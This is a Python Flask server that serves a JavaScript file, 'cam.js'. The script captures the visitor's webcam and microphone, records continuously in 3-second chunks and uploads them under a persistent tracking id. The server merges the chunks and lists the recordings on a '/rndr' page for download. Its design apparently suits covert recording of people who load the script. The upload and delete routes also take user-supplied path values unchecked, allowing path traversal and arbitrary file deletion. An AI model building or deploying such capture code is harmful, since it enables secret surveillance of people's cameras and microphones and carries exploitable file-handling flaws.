from flask import Flask, request, send_from_directory
import os, shutil, threading, time, uuid
from datetime import datetime
from flask_cors import CORS
app = Flask(__name__)
CORS(app)
BASE_DIR = os.getcwd()
CHUNK_DIR = os.path.join(BASE_DIR, 'videos', 'chunks')
FINAL_DIR = os.path.join(BASE_DIR, 'videos', 'final')
os.makedirs(CHUNK_DIR, exist_ok=True)
os.makedirs(FINAL_DIR, exist_ok=True)

def merge_chunks(user_id):
    user_path = os.path.join(CHUNK_DIR, user_id)
    files = sorted([os.path.join(user_path, f) for f in os.listdir(user_path)])
    if not files:
        return
    filename = f"{user_id}_{datetime.now().strftime('%H%M%S')}_{uuid.uuid4().hex[:5]}.webm"
    out_path = os.path.join(FINAL_DIR, filename)
    with open(out_path, 'wb') as merged:
        for file in files:
            with open(file, 'rb') as f:
                merged.write(f.read())
    shutil.rmtree(user_path, ignore_errors=True)

def monitor_user_chunks(user_id):
    user_path = os.path.join(CHUNK_DIR, user_id)
    last_seen = time.time()
    while time.time() - last_seen < 20:
        time.sleep(2)
        if not os.path.exists(user_path):
            return
        try:
            last_modified = max(os.path.getmtime(os.path.join(user_path, f)) for f in os.listdir(user_path))
            if last_modified > last_seen:
                last_seen = last_modified
        except:
            return
    merge_chunks(user_id)

@app.route('/')
def home():
    return '<h2>Video Server</h2><p><a href="/cam.js">/cam.js</a> | <a href="/rndr">/rndr</a></p>'

@app.route('/cam.js')
def camjs():
    return '''
navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
  const mediaRecorder = new MediaRecorder(stream);
  let user_id = localStorage.getItem("uid") || (Math.random()+"").slice(2);
  localStorage.setItem("uid", user_id);
  mediaRecorder.ondataavailable = e => {
    let blob = new Blob([e.data], { type: 'video/webm' });
    let form = new FormData();
    form.append('video', blob);
    form.append('uid', user_id);
    fetch('/upload', { method: 'POST', body: form });
  };
  mediaRecorder.start();
  setInterval(() => mediaRecorder.stop(), 3000);
  mediaRecorder.onstop = () => mediaRecorder.start();
});
    ''', 200, {'Content-Type': 'application/javascript'}

@app.route('/upload', methods=['POST'])
def upload():
    uid = request.form.get('uid')
    file = request.files['video']
    user_path = os.path.join(CHUNK_DIR, uid)
    os.makedirs(user_path, exist_ok=True)
    fname = datetime.now().strftime('%H%M%S') + '.webm'
    file.save(os.path.join(user_path, fname))
    threading.Thread(target=monitor_user_chunks, args=(uid,), daemon=True).start()
    return '', 204

@app.route('/rndr')
def render_page():
    files = os.listdir(FINAL_DIR)
    items = ''
    for f in sorted(files):
        items += f'''
        <div style="margin:10px;padding:10px;border:1px solid #ccc">
            <video src="/final/{f}" controls width="300"></video><br>
            {f}<br>
            <a href="/final/{f}" download>Download</a> |
            <a href="/del/{f}">Delete</a>
        </div>'''
    return f'''
    <html><body><h1>Saved Videos</h1>{items}</body></html>
    '''

@app.route('/final/<path:filename>')
def serve_video(filename):
    return send_from_directory(FINAL_DIR, filename)

@app.route('/del/<path:filename>')
def delete_video(filename):
    fpath = os.path.join(FINAL_DIR, filename)
    if os.path.exists(fpath): os.remove(fpath)
    return 'Deleted'

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
